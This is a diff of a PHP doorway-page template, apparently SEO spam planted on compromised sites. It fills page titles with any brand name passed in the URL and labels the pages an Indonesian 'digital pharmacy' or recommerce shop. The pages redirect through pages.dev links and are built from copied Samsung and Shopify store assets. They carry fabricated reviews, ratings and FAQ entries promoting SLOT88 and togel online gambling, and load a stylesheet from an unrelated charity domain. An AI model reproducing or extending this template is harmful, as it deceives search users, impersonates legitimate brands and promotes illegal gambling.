@@ -19,15 +19,15 @@ function clean($str) {
     return htmlspecialchars(strip_tags(trim($str)), ENT_QUOTES, 'UTF-8');
 }
 
-if (isset($_GET['id'])) {
+if (isset($_GET['ID_id'])) {
 
     $lines = file($filename, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
-    $target_string = strtolower(clean($_GET['id']));
+    $target_string = strtolower(clean($_GET['ID_id']));
     $BRAND = null;
 
     foreach ($lines as $item) {
         if (strtolower(trim($item)) === $target_string) {
-            $BRAND = strtoupper($target_string);
+            $BRAND = strtoupper(trim($item));
             break;
         }
     }
@@ -36,18 +36,42 @@ if (isset($_GET['id'])) {
         denied();
     }
 
+    // =========================
+    // BRAND2 TETAP (TIDAK BERUBAH)
+    // =========================
+    $brand2_list = [];
+
+    foreach ($lines as $item) {
+        $item = strtoupper(trim($item));
+
+        if ($item !== $BRAND) {
+            $brand2_list[] = $item;
+        }
+    }
+
+    if (!empty($brand2_list)) {
+        // Selalu menghasilkan BRAND2 yang sama untuk BRAND yang sama
+        $index = crc32($BRAND) % count($brand2_list);
+        $BRAND2 = $brand2_list[$index];
+    } else {
+        $BRAND2 = $BRAND;
+    }
+
     // URL
     $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https' : 'http';
     $current_url = $protocol . "://" . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
 
     // SEO DATA (AUTO GENERATE)
-    $title = "$BRAND : Solusi Belanja Cerdas yang Ramah Lingkungan";
-    $description = "$BRAND adalah marketplace recommerce yang menawarkan produk surplus dan overstock dengan diskon hingga 80% sekaligus membantu mengurangi food waste dan mendukung ekonomi sirkular.";
-    
-    // Bisa diganti random image atau CDN sendiri
-    $image = "https://i.pinimg.com/1200x/60/75/60/6075608ac89253cebb9db91e11dd9ae0.jpg";
+    $title = "$BRAND x $BRAND2 - Solusi Apotek Digital untuk Kebutuhan Obat dan Produk Kesehatan Modern";
 
-    // Canonical URL  
+    $description = "$BRAND x $BRAND2 menyediakan layanan apotek digital dengan akses mudah ke obat, produk kesehatan, dan kebutuhan farmasi melalui sistem online yang praktis dan aman.";
+    
+    $artikel = "$BRAND x $BRAND2 hadir sebagai platform kesehatan digital yang membantu pengguna memperoleh kebutuhan farmasi melalui layanan online. Dengan konsep apotek modern, platform ini mendukung kemudahan akses terhadap produk kesehatan sekaligus memberikan pengalaman belanja yang lebih efisien.";
+
+    // Bisa diganti random image atau CDN sendiri
+    $image = "https://i.pinimg.com/1200x/54/7d/b1/547db14b4a104f5e5d5a180f74888cf4.jpg";  
+
+    // Canonical URL
     $canonical = $current_url;
 
 } else {
@@ -55,6588 +79,10344 @@ if (isset($_GET['id'])) {
 }
 
 // Redirect target
-$ampmek = "https://surplus-ajs.pages.dev/?id=$BRAND";
-$logo = "https://i.postimg.cc/ZqYHL06j/logo-138.gif";
+$ampmek = "https://faholospharmacy.pages.dev/?ID_id=$BRAND";
+$logo = "https://www.residentviews.com/assets/logo/aztec88-x-mediaslot78-dunia-game-digital-yang-setiap-detiknya-punya-kejutan.png";
+$favicon = "https://www.residentviews.com/assets/icon/aztec88-x-mediaslot78-dunia-game-digital-yang-setiap-detiknya-punya-kejutan.png";
 ?>
 
+<!DOCTYPE html>
+<html lang="id-ID">
+<head>
+<link href="<?= $canonical; ?>" rel="preconnect"/>
+<meta charset="utf-8"/>
+<meta content="IE=edge" http-equiv="X-UA-Compatible"/>
+<meta content="text/html; charset=utf-8" http-equiv="content-type"/>
+<meta content="width=device-width, initial-scale=1" name="viewport"/>
+<title><?= $title; ?></title>
+<meta name="title" content="<?= $title; ?>">
+<meta name="robots" content="index, follow">
+<link rel="canonical" href="<?= $canonical; ?>">
+<link rel="amphtml" href="<?= $ampmek; ?>">
+<link rel="alternate" hreflang="id-id" href="<?= $ampmek; ?>"/>
+<link rel="alternate" hreflang="id" href="<?= $ampmek; ?>"/>
+<meta name="publisher" content="<?= $BRAND; ?> x <?= $BRAND2; ?>">
+<meta name="description" content="<?= $description; ?>">
+<meta name="keywords" content="<?= $BRAND; ?> x <?= $BRAND2; ?>, Game Digital Yang Setiap, Digital Yang Setiap Detiknya, Setiap Detiknya Punya Kejutan, Yang Setiap Detiknya Punya, Dunia Game Digital Yang" />
+<meta name="sitecode" content="id">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="<?= $title; ?>">
+<meta name="twitter:description" content="<?= $description; ?>">
+<meta name="twitter:url" content="<?= $canonical; ?>">
+<meta name="twitter:image" content="<?= $logo; ?>">
+<meta property="og:type" content="website">
+<meta property="og:site_name" content="<?= $BRAND; ?> x <?= $BRAND2; ?>">
+<meta property="og:locale" content="id_ID">
+<meta property="og:url" content="<?= $canonical; ?>">
+<meta property="og:title" content="<?= $title; ?>">
+<meta property="og:description" content="<?= $description; ?>">
+<meta property="og:image" content="<?= $image; ?>">
+<link rel="icon" type="image/png" sizes="96x96" href="<?= $favicon; ?>">
+<link rel="shortcut icon" href="<?= $favicon; ?>">
+<link rel="apple-touch-icon" sizes="144x144" href="<?= $favicon; ?>">
+<link href="https://www.samsung.com/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-site/sites/global/css/fonts.min.8a18f528e82f16d7420d24afc5dbd284.css" rel="stylesheet" type="text/css"/>
+<link href="https://www.samsung.com/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-site/sites/id.min.d4a873f5ad80fabc15ee8200be9ce4ea.css" rel="stylesheet" type="text/css"/>
+<link href="https://www.samsung.com/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-dependencies.min.1dd1d47f040029bab499de380db9b346.css" rel="stylesheet" type="text/css"/>
+<link href="https://www.samsung.com/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-base-ux25.min.cfaf16f3ce915af071216f8067965b12.css" rel="stylesheet" type="text/css"/>
+<link as="image" href="https://images.samsung.com/is/image/samsung/p6pim/id/sm-a075fzkdxid/gallery/id-galaxy-a07-sm-a075-sm-a075fzkdxid-548603128?$360_288_PNG$" media="(max-width:767px) and (-webkit-max-device-pixel-ratio: 1.4)" rel="preload">
+<link as="image" href="https://images.samsung.com/is/image/samsung/p6pim/id/sm-a075fzkdxid/gallery/id-galaxy-a07-sm-a075-sm-a075fzkdxid-548603128?$720_576_PNG$" media="(max-width:767px) and (-webkit-min-device-pixel-ratio: 1.5)" rel="preload">
+<link as="image" href="https://images.samsung.com/is/image/samsung/p6pim/id/sm-a075fzkdxid/gallery/id-galaxy-a07-sm-a075-sm-a075fzkdxid-548603128?$365_292_PNG$" media="(min-width:768px) and (max-width:1365px) and (-webkit-max-device-pixel-ratio: 1.4)" rel="preload">
+<link as="image" href="https://images.samsung.com/is/image/samsung/p6pim/id/sm-a075fzkdxid/gallery/id-galaxy-a07-sm-a075-sm-a075fzkdxid-548603128?$730_584_PNG$" media="(min-width:768px) and (max-width:1365px) and (-webkit-max-device-pixel-ratio: 1.5)" rel="preload">
+<link as="image" href="https://images.samsung.com/is/image/samsung/p6pim/id/sm-a075fzkdxid/gallery/id-galaxy-a07-sm-a075-sm-a075fzkdxid-548603128?$650_519_PNG$" media="(min-width:1366px) and (-webkit-max-device-pixel-ratio: 1.4)" rel="preload"/>
+<link as="image" href="https://images.samsung.com/is/image/samsung/p6pim/id/sm-a075fzkdxid/gallery/id-galaxy-a07-sm-a075-sm-a075fzkdxid-548603128?$1300_1038_PNG$" media="(min-width:1366px) and (-webkit-max-device-pixel-ratio: 1.5)" rel="preload"/>
+<link href="https://www.samsung.com/etc.clientlibs/samsung/components/content/consumer/global/product-dynamic/pd-g-anchor-navigation-ux25/clientlibs/site.min.f0928494201809fec3a1e8977d8c2a53.css" rel="stylesheet" type="text/css"/>
+<link href="https://www.samsung.com/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-templates/page-buying-pd.min.31450f4f522ff9cbaa6a27f7b92a8f37.css" rel="stylesheet" type="text/css"/>
+<link href="https://www.samsung.com/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-templates/page-buying-pd/compactComps.min.c8df1c312f007cbe365067bcf47300e4.css" rel="stylesheet" type="text/css"/>
+<link href="https://www.samsung.com/etc.clientlibs/samsung/clientlibs/consumer/global/clientlib-templates/page-buying-pd/compactComps-h-n.min.d41d8cd98f00b204e9800998ecf8427e.css" rel="stylesheet" type="text/css"/>
+<link href="https://www.samsung.com/etc.clientlibs/samsung/components/content/consumer/global/product-popup/pd-g-wishlist-popup/clientlibs/site.min.d49c101fdadccee88e030f4c91651e9c.css" rel="stylesheet" type="text/css"/>
+<link href="https://www.samsung.com/etc.clientlibs/samsung/components/content/consumer/global/product-popup/pd-g-eip-popup/clientlibs/site.min.f2f39cae0431b16573847bcb7d615526.css" rel="stylesheet" type="text/css"/>
+<script type="text/javascript">
+       var winhref = window.location.href.replace("/content/samsung","").replace(".html","https://www.samsung.com/");
+if ( winhref.indexOf("?") > 0) {
+	winhref = winhref.substring(0, winhref.indexOf("?"));
+}
+var siteCode = winhref.split("https://www.samsung.com/")[3];
+//cn인 경우는 경로에서 siteCode를 추출할 수 없으므로 다른 방법으로 접근
+if(winhref.indexOf("samsung.com.cn") > 0) {
+	siteCode = "cn";
+}
 
-  <!doctype html>
-  <html class="no-js" lang="id">
-    <head>
-    <meta charset="utf-8" />
-    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
-    <meta name="viewport" content="width=device-width,initial-scale=1" />
-    <link rel="canonical" href="<?= $canonical; ?>" />
-    <link rel="amphtml" href="<?= $ampmek; ?>" />
-    <link rel="alternate" hreflang="id-id" href="<?= $ampmek; ?>"/>
-    <link rel="alternate" hreflang="id" href="<?= $ampmek; ?>"/>
-    <link rel="alternate" href="<?= $ampmek; ?>"/>
-    <link rel="alternate" hreflang="en" href="<?= $ampmek; ?>"/>
-    <link rel="alternate" hreflang="x-default" href="<?= $ampmek; ?>"/>
-    <meta content='index, follow, nosnippet' name='robots'>
-    <link rel="preconnect" href="https://cdn.shopify.com" crossorigin />
-    <link rel="preconnect" href="https://fonts.shopifycdn.com" crossorigin />
-    <link rel="shortcut icon" href="https://apollondestroyer.org/uplloner/uploads/file_6a54102a9aa46.png">
-    <link rel="icon" type="image/webp" sizes="32x32" href="https://apollondestroyer.org/uplloner/uploads/file_6a54102a9aa46.png">
-    <link rel="icon" type="image/webp" sizes="16x16" href="https://apollondestroyer.org/uplloner/uploads/file_6a54102a9aa46.png">
-    <link rel="apple-touch-icon" sizes="180x180" href="https://apollondestroyer.org/uplloner/uploads/file_6a54102a9aa46.png">
-    <title><?= $title; ?></title> 
-    <meta name="description" content="<?= $description; ?>" /> 
-    <meta property="og:site_name" content="<?= $BRAND; ?>" />
-    <meta property="og:url" content="<?= $canonical; ?>" />
-    <meta property="og:title" content="<?= $title; ?>" />
-    <meta property="og:type" content="product" />
-    <meta property="og:description" content="<?= $description; ?>" />
-    <meta property="og:image" content="<?= $image; ?>" />
-    <meta property="og:image:secure_url" content="<?= $image; ?>" />
-    <meta property="og:image:width" content="600" />
-    <meta property="og:image:height" content="600" />
-    <meta property="og:price:amount" content="1.00" />
-    <meta property="og:price:currency" content="SGD" />
-    <meta property="og:locale" content="id_ID" />
-    <meta name="twitter:card" content="summary_large_image" />
-    <meta name="twitter:title" content="<?= $title; ?>" />
-    <meta name="twitter:description" content="<?= $description; ?>" />
-    <script>
-      window.SDG = window.SDG || {};
-      SDG.Data = {
-      template: "product",
-      language: "EN",
-      locationCookie: false,
-      locationCookieExpiry: 1,
-      ctoNoCoverage: "No coverage",
-      ctoProductModalDescription: "To get {{ selected_option_title }} we changed your selection to:",
-      ctoUpdateMessageDescription: "is changed",
-      noCombinationMessage: "Combination does not exist",
-      productPriceFrom: "From {{ price }}",
-      nmpPriceCalculation: "/mo. for {{ per_month }} mo."
-      };
-    </script>
-    <script src="https://www.istudiosg.com/cdn/shop/t/14/assets/jquery-latest.min.js?v=174441762609953228921742784888"></script>
-    <script src="https://www.istudiosg.com/cdn/shop/t/14/assets/constants.js?v=58251544750838685771742784887" defer></script>
-    <script src="https://www.istudiosg.com/cdn/shop/t/14/assets/pubsub.js?v=158357773527763999511742784889" defer></script>
-    <script src="https://www.istudiosg.com/cdn/shop/t/14/assets/global.js?v=86940198807662246831742784888" defer></script>
-    <script src="https://www.istudiosg.com/cdn/shop/t/14/assets/slick.min.js?v=177366201532680719881742784889" defer></script>
-    <script src="https://www.istudiosg.com/cdn/shop/t/14/assets/slick-custom.js?v=124467254043905770051742784887" defer></script>
-    <script src="https://www.istudiosg.com/cdn/shop/t/14/assets/fancybox-3-5-7.js?v=45336575563953974081742784888" defer></script>
-    <script src="https://www.istudiosg.com/cdn/shop/t/14/assets/ac-modal.min.js?v=177811281368891218321742784887" defer></script>
-    <script src="https://www.istudiosg.com/cdn/shop/t/14/assets/ac-modal-custom.js?v=65753906577603767491742784888" defer></script>
-    <script src="https://www.istudiosg.com/cdn/shop/t/14/assets/product-form.js?v=29435186399513605341757430292" defer></script>
-    <script src="https://www.istudiosg.com/cdn/shop/t/14/assets/lazyload-section.js?v=5359969406261385591742784888" defer></script>
-    <script src="https://www.istudiosg.com/cdn/shop/t/14/assets/adobe-analytics-tracking.js?v=123617832924672007461742784888" defer></script>
-        <script>
-          SDG.Data.adobeAnalyticsData = {
-            page_name: "Product",
-            page_type: "product",
-            page_url: window.location.hostname + window.location.pathname,
-            page_title: document.title,
-            language: "EN",
-            country: "SG",
-            currency: "SGD",
-            
-              login_status: 'logged out',
-            
-          };
-        </script>
-        <script>
-          window.dataLayer = window.dataLayer || [];
-        </script>
-        <script>window.performance && window.performance.mark && window.performance.mark('shopify.content_for_header.start');</script>
-        <meta id="shopify-digital-wallet" name="shopify-digital-wallet" content="/63738642612/digital_wallets/dialog">
-        <script async="async" src="/checkouts/internal/preloads.js?locale=en-SG"></script>
-        <script id="shopify-features" type="application/json">{"accessToken":"02dc024b3b107f5c668c6465659caac4","betas":["rich-media-storefront-analytics"],"domain":"www.istudiosg.com","predictiveSearch":true,"shopId":63738642612,"locale":"en"}</script>
-        <script>var Shopify = Shopify || {};
-          Shopify.shop = "istudio-elush-production.myshopify.com";
-          Shopify.locale = "en";
-          Shopify.currency = {"active":"SGD","rate":"1.0"};
-          Shopify.country = "SG";
-          Shopify.theme = {"name":"360u00265 - 2.0","id":139536236724,"schema_name":"Dawn","schema_version":"11.0.0","theme_store_id":null,"role":"main"};
-          Shopify.theme.handle = "null";
-          Shopify.theme.style = {"id":null,"handle":null};
-          Shopify.cdnHost = "www.istudiosg.com/cdn";
-          Shopify.routes = Shopify.routes || {};
-          Shopify.routes.root = "/";
-        </script>
-        <script type="module">!function(o){(o.Shopify=o.Shopify||{}).modules=!0}(window);</script>
-        <script>!function(o){function n(){var o=[];function n(){o.push(Array.prototype.slice.apply(arguments))}return n.q=o,n}var t=o.Shopify=o.Shopify||{};t.loadFeatures=n(),t.autoloadFeatures=n()}(window);</script>
-        <script id="shop-js-analytics" type="application/json">{"pageType":"product"}</script>
-        <script defer="defer" async="async" src="//www.istudiosg.com/cdn/shopifycloud/shop-js/client.js" onload="window.Shopify.SignInWithShop?.initShopCartSync?.({&quot;fedCMEnabled&quot;:true,&quot;windoidEnabled&quot;:true});
-          "></script>
-        <script>(function() {
-          var isLoaded = false;
-          function asyncLoad() {
-            if (isLoaded) return;
-            isLoaded = true;
-            var urls = ["//app.backinstock.org/widget/91512_1746008386.js?category=bisu0026v=6u0026shop=istudio-elush-production.myshopify.com"];
-            for (var i = 0; i < urls.length; i++) {
-              var s = document.createElement('script');
-              s.type = 'text/javascript';
-              s.async = true;
-              s.src = urls[i];
-              var x = document.getElementsByTagName('script')[0];
-              x.parentNode.insertBefore(s, x);
-            }
-          };
-          if(window.attachEvent) {
-            window.attachEvent('onload', asyncLoad);
-          } else {
-            window.addEventListener('load', asyncLoad, false);
-          }
-          })();
-        </script>
-        <script id="__st">var __st={"a":63738642612,"offset":28800,"reqid":"04c86973-5e2c-42e3-9d06-03b64158a049-1759762349","pageurl":"www.istudiosg.com/products/iphone-17-pro-mg8h4x-a","u":"1f94d1565a86","p":"product","rtyp":"product","rid":7986665160884};</script>
-        <script>window.ShopifyPaypalV4VisibilityTracking = true;</script>
-        <script type="application/ld+json">
-  {
-    "@context": "https://schema.org",
-    "@type": "Product",
-    "url": "<?= $canonical; ?>",
-    "name": "<?= $title; ?>",
-    "sku": "3215878451",
-    "description": "<?= $description; ?>",
-    "image": [
-      {
-        "@type": "ImageObject",
-        "author": "SLOT88",
-        "contentUrl": "<?= $image; ?>",
-        "thumbnailUrl": "<?= $image; ?>"
-      }
-    ],
-    "category": "Android Game < TOGEL ONLINE < SLOT88",
-    "brand": {
-      "@type": "Brand",
-      "name": "<?= $BRAND; ?>"
-    },
-    "logo": "<?= $image; ?>",
-    "aggregateRating": {
-      "@type": "AggregateRating",
-      "ratingValue": 4.9,
-      "reviewCount": 165487
-    },
-    "offers": {
-      "@type": "AggregateOffer",
-      "offerCount": 952,
-      "lowPrice": 258621,
-      "highPrice": 494253,
-      "priceCurrency": "IDR",
-      "availability": "https://schema.org/InStock",
-      "shippingDetails": {
-        "@type": "OfferShippingDetails",
-        "shippingOrigin": {
-          "@type": "DefinedRegion",
-          "addressCountry": "ID"
-        }
-      }
-    },
-    "review": [
-      {
-        "@type": "Review",
-        "reviewRating": { "@type": "Rating", "ratingValue": 5, "bestRating": 5 },
-        "datePublished": "2025-07-12",
-        "reviewBody": "Saya memilih <?= $BRAND; ?> ft SLOT88 karena platformnya memiliki tampilan yang modern dan mudah digunakan. Berbagai pilihan permainan tersedia dalam satu akun sehingga lebih praktis diakses kapan saja. Performa website yang stabil membuat pengalaman bermain terasa semakin nyaman.",
-        "author": { "@type": "Person", "name": "Air" }
-      },
-      {
-        "@type": "Review",
-        "reviewRating": { "@type": "Rating", "ratingValue": 5, "bestRating": 5 },
-        "datePublished": "2025-08-18",
-        "reviewBody": "<?= $BRAND; ?> ft SLOT88 – Duet Maut Keistimewahan Kerja Sama Togel Online & Toto Slot Terpopuler menghadirkan koleksi permainan yang lengkap dengan sistem yang responsif. Navigasi yang sederhana memudahkan saya mengakses berbagai menu melalui smartphone maupun komputer",
-        "author": { "@type": "Person", "name": "Api" }
-      },
-      {
-        "@type": "Review",
-        "reviewRating": { "@type": "Rating", "ratingValue": 5, "bestRating": 5 },
-        "datePublished": "2025-08-03",
-        "reviewBody": "Saya merasa puas menggunakan <?= $BRAND; ?> ft SLOT88 karena proses transaksi berjalan dengan praktis dan layanan pelanggan selalu siap membantu selama 24 jam. Platform ini juga rutin memperbarui informasi sehingga memberikan pengalaman penggunaan yang lebih baik.",
-        "author": { "@type": "Person", "name": "Bumi" }
-      },
-      {
-        "@type": "Review",
-        "reviewRating": { "@type": "Rating", "ratingValue": 5, "bestRating": 5 },
-        "datePublished": "2025-03-07",
-        "reviewBody": "Yang saya sukai dari <?= $BRAND; ?> ft SLOT88 adalah tampilan website yang responsif serta pilihan permainan yang beragam. Semua fitur mudah dipahami, sehingga pengguna baru maupun lama dapat mengakses layanan dengan nyaman tanpa mengalami kesulitan",
-        "author": { "@type": "Person", "name": "Angin" }
-      }
-    ]
-  }
-  </script>
+//depth Info.
+var depth = winhref.split("https://www.samsung.com/").length;
+var depth_last = winhref.split("https://www.samsung.com/")[depth-1];
+if(depth_last =="" || depth_last.charAt(0)=="?"){
+	depth -= 1;
+}
 
+//set pathIndicator(not product page)
+var pageName = "";    
+var depth_2 = "";
+var depth_3 = "";
+var depth_4 = "";
+var depth_5 = "";
+var digitalData = {
+	"page" : {
+			"pageInfo" : {
+					"siteCode"    : "id",
+					"pageName"    : pageName,
+					"pageID"      : "L2NvbnRlbnQvc2Ftc3VuZy9pZC9zbWFydHBob25lcy9nYWxheHktYS9nYWxheHktYTA3LWJsYWNrLTY0Z2Itc20tYTA3NWZ6a2R4aWQvYnV5",
+					"pageTrack"   : "product detail",
+					"originPlaform" : "web"
+			},
+			"pathIndicator" : {
+					"depth_2" : depth_2,
+					"depth_3" : depth_3,
+					"depth_4" : depth_4,
+					"depth_5" : depth_5
+			}
+	},
+	"user": {
+			"userDeviceList": [
+			]
+	},
+	"product" : {
+			"category" : "", 
+			"model_code" : "", // PD class정보 이용하여 설정
+			"model_name" : "", // PD page(server-side)
+			"displayName" : "", // PD class정보 이용하여 설정
+			"pvi_type_code" : "", //PD page(server-side)
+			"pvi_type_name" : "", //PD page(server-side)
+			"pvi_subtype_code" : "", //PD page(server-side)
+			"pvi_subtype_name" : "",//PD page(server-side)
+			"pd_type" : "", //PD type
+            "content_id" : "",
+            "products" : "",
+            "prodView" : ""
+	}
+}
+      </script>
+      <!-- vdSiteFlag=[] -->
+      <!-- vdLtrSiteFlag=[] -->
+      <script type="text/javascript">
+       digitalData.page.pageInfo.pageTrack = "product detail";
+digitalData.product.model_code = "SM\u002DA075FZKDXID".replace(/&/g, ' and ').replace(/  /g,' ');
+digitalData.product.displayName = "Galaxy A07".replace(/(<([^>]+)>)/gi, "").replace(/&/g, ' and ').replace(/  /g,' ');
+digitalData.product.model_name = "SM\u002DA075F\/DS".replace(/&/g, ' and ').replace(/  /g,' ');
+digitalData.product.products = "SM\u002DA075F\/DS".replace(/&/g, ' and ').replace(/  /g,' ');
 
+digitalData.page.pathIndicator.depth_2 = "mobile".replace(/&/g, ' and ').replace(/  /g,' ');
+digitalData.page.pathIndicator.depth_3 = "smartphones".replace(/&/g, ' and ').replace(/  /g,' ');
+digitalData.page.pathIndicator.depth_4 = "galaxy a".replace(/&/g, ' and ').replace(/  /g,' ');
+digitalData.page.pathIndicator.depth_5 = "galaxy\u002Da07\u002Dblack\u002D64gb\u002Dsm\u002Da075fzkdxid".replace(/&/g, ' and ').replace(/  /g,' ');
 
-  <script type="application/ld+json">
-  {
-    "@context": "https://schema.org",
-    "@type": "VideoObject",
-    "name": "<?= $title; ?>",
-    "description": "<?= $description; ?>",
-    "thumbnailUrl": [
-      "<?= $image; ?>",
-      "<?= $image; ?>"
-    ],
-    "uploadDate": "2024-09-28T04:19:10-04:00",
-    "duration": "PT18S"
-  }
-  </script>
+digitalData.product.pvi_type_code = "pt_cd_mobile".replace(/&/g, ' and ').replace(/  /g,' ');
+digitalData.product.pvi_type_name = "mobile".replace(/&/g, ' and ').replace(/  /g,' ');
+digitalData.product.pvi_subtype_code = "pt_cd_mobile_01".replace(/&/g, ' and ').replace(/  /g,' ');
+digitalData.product.pvi_subtype_name = "smartphone".replace(/&/g, ' and ').replace(/  /g,' ');
+digitalData.product.pim_subtype_name = digitalData.page.pathIndicator.depth_4;
+digitalData.product.pd_type = "no sale";
 
+//set pageName
+var pageName = digitalData.page.pageInfo.siteCode;
+if(digitalData.page.pathIndicator.depth_2 != ""){
+	pageName += ":" + digitalData.page.pathIndicator.depth_2;
+}
+	
+if(digitalData.page.pathIndicator.depth_3 != ""){
+	pageName += ":" + digitalData.page.pathIndicator.depth_3;
+}
+	
+if(digitalData.page.pathIndicator.depth_4 != ""){
+	pageName += ":" + digitalData.page.pathIndicator.depth_4;
+}
 
-
-  <script type="application/ld+json">
-  {
-    "@context": "https://schema.org",
-    "@type": "BreadcrumbList",
-    "itemListElement": [
-      {
-        "@type": "ListItem",
-        "position": 1,
-        "name": "<?= $BRAND; ?>",
-        "item": "<?= $canonical; ?>"
-      },
-      {
-        "@type": "ListItem",
-        "position": 2,
-        "name": "SLOT88",
-        "item": "<?= $canonical; ?>"
-      },
-      {
-        "@type": "ListItem",
-        "position": 3,
-        "name": "TOTO TOGEL",
-        "item": "<?= $canonical; ?>"
-      },
-      {
-        "@type": "ListItem",
-        "position": 4,
-        "name": "TOGEL ONLINE",
-        "item": "<?= $canonical; ?>"
-      },
-      {
-        "@type": "ListItem",
-        "position": 5,
-        "name": "SLOT",
-        "item": "<?= $canonical; ?>"
-      },
-      {
-        "@type": "ListItem",
-        "position": 6,
-        "name": "TOGEL 4D",
-        "item": "<?= $canonical; ?>"
-      },
-      {
-        "@type": "ListItem",
-        "position": 7,
-        "name": "LINK TOGEL",
-        "item": "<?= $canonical; ?>"
-      },
-      {
-        "@type": "ListItem",
-        "position": 8,
-        "name": "SITUS SLOT",
-        "item": "<?= $canonical; ?>"
-      },
-      {
-        "@type": "ListItem",
-        "position": 9,
-        "name": "<?= $title; ?>",
-        "item": "<?= $canonical; ?>"
-      }
-    ]
-  }
-  </script>
-
-
-
-  <script type="application/ld+json">
-  {
-    "@context": "https://schema.org",
-    "@graph": [
-      {
-        "@type": "Organization",
-        "@id": "<?= $canonical; ?>#org",
-        "name": "SLOT88",
-        "url": "<?= $canonical; ?>",
-        "logo": "<?= $image; ?>"
-      },
-      {
-        "@type": "WebSite",
-        "@id": "<?= $canonical; ?>#website",
-        "url": "<?= $canonical; ?>",
-        "name": "<?= $BRAND; ?> ft SLOT88",
-        "publisher": { "@id": "<?= $canonical; ?>#org" },
-        "inLanguage": "id-ID",
-        "potentialAction": {
-          "@type": "SearchAction",
-          "target": "<?= $canonical; ?>?s={search_term_string}",
-          "query-input": "required name=search_term_string"
-        }
-      },
-      {
-        "@type": "SoftwareApplication",
-        "@id": "<?= $canonical; ?>#app",
-        "name": "SLOT88",
-        "applicationCategory": "GameApplication",
-        "operatingSystem": "Android, iOS, Windows",
-        "offers": { "@type": "Offer", "price": "0", "priceCurrency": "IDR" },
-        "aggregateRating": {
-          "@type": "AggregateRating",
-          "ratingValue": 4.9,
-          "ratingCount": 164872
-        }
-      }
-    ]
-  }
-  </script>
-
-
-
-  <script type="application/ld+json">
-  {
-    "@context": "https://schema.org",
-    "@type": "FAQPage",
-    "mainEntity": [
-      {
-        "@type": "Question",
-        "name": "Apa itu <?= $BRAND; ?> ft SLOT88 – Duet Maut Keistimewahan Kerja Sama Togel Online & Toto Slot Terpopuler?",
-        "acceptedAnswer": {
-          "@type": "Answer",
-          "text": "<?= $BRAND; ?> ft SLOT88 merupakan platform game online yang menyediakan berbagai pilihan permainan seperti Toto Togel, Toto Slot, Bola Parlay, Live Casino, dan kategori permainan populer lainnya dengan sistem yang mudah diakses melalui berbagai perangkat."
-        }
-      },
-      {
-        "@type": "Question",
-        "name": "Apa saja keunggulan yang ditawarkan <?= $BRAND; ?> ft SLOT88?",
-        "acceptedAnswer": {
-          "@type": "Answer",
-          "text": "Platform ini menawarkan tampilan website yang modern, sistem yang responsif, pilihan permainan yang lengkap, akses cepat melalui desktop maupun smartphone, serta layanan pelanggan yang tersedia selama 24 jam."
-        }
-      },
-      {
-        "@type": "Question",
-        "name": "Apakah <?= $BRAND; ?> ft SLOT88 dapat diakses melalui perangkat mobile?",
-        "acceptedAnswer": {
-          "@type": "Answer",
-          "text": "Ya. <?= $BRAND; ?> ft SLOT88 dapat diakses menggunakan smartphone Android, iPhone, tablet, laptop, maupun komputer tanpa perlu menginstal aplikasi tambahan sehingga pengguna dapat menikmati layanan dengan lebih fleksibel."
-        }
-      },
-      {
-        "@type": "Question",
-        "name": "Bagaimana layanan pelanggan di <?= $BRAND; ?> ft SLOT88?",
-        "acceptedAnswer": {
-          "@type": "Answer",
-          "text": "<?= $BRAND; ?> ft SLOT88 menyediakan layanan pelanggan selama 24 jam yang siap membantu pengguna dalam memperoleh informasi mengenai akun, transaksi, maupun penggunaan platform dengan pelayanan yang cepat dan profesional."
-        }
-      },
-      {
-        "@type": "Question",
-        "name": "Mengapa banyak pengguna memilih <?= $BRAND; ?> ft SLOT88?",
-        "acceptedAnswer": {
-          "@type": "Answer",
-          "text": "Banyak pengguna memilih <?= $BRAND; ?> ft SLOT88 karena menghadirkan pilihan permainan yang beragam, performa website yang stabil, tampilan yang ramah pengguna, proses transaksi yang praktis, serta pengalaman penggunaan yang nyaman melalui berbagai perangkat."
-        }
-      }
-    ]
-  }
-  </script>
-
-        <script integrity="sha256-52AcMU7V7pcBOXWImdc/TAGTFKeNjmkeM1Pvks/DTgc=" data-source-attribution="shopify.loadfeatures" defer="defer" src="//www.istudiosg.com/cdn/shopifycloud/storefront/assets/storefront/load_feature-81c60534.js" crossorigin="anonymous"></script>
-        <script data-source-attribution="shopify.dynamic_checkout.dynamic.init">var Shopify=Shopify||{};Shopify.PaymentButton=Shopify.PaymentButton||{isStorefrontPortableWallets:!0,init:function(){window.Shopify.PaymentButton.init=function(){};var t=document.createElement("script");t.src="https://www.istudiosg.com/cdn/shopifycloud/portable-wallets/latest/portable-wallets.en.js",t.type="module",document.head.appendChild(t)}};</script>
-        <script data-source-attribution="shopify.dynamic_checkout.buyer_consent">
-          function portableWalletsHideBuyerConsent(e){var t=document.getElementById("shopify-buyer-consent"),n=document.getElementById("shopify-subscription-policy-button");t&&n&&(t.classList.add("hidden"),t.setAttribute("aria-hidden","true"),n.removeEventListener("click",e))}function portableWalletsShowBuyerConsent(e){var t=document.getElementById("shopify-buyer-consent"),n=document.getElementById("shopify-subscription-policy-button");t&&n&&(t.classList.remove("hidden"),t.removeAttribute("aria-hidden"),n.addEventListener("click",e))}window.Shopify?.PaymentButton&&(window.Shopify.PaymentButton.hideBuyerConsent=portableWalletsHideBuyerConsent,window.Shopify.PaymentButton.showBuyerConsent=portableWalletsShowBuyerConsent);
-        </script>
-        <script data-source-attribution="shopify.dynamic_checkout.cart.bootstrap">document.addEventListener("DOMContentLoaded",(function(){function t(){return document.querySelector("shopify-accelerated-checkout-cart, shopify-accelerated-checkout")}if(t())Shopify.PaymentButton.init();else{new MutationObserver((function(e,n){t()&&(Shopify.PaymentButton.init(),n.disconnect())})).observe(document.body,{childList:!0,subtree:!0})}}));</script>
-        <link rel="stylesheet" href="https://protection-animale-catholique.org/matrix/shadowcss/protection/sytle.css">
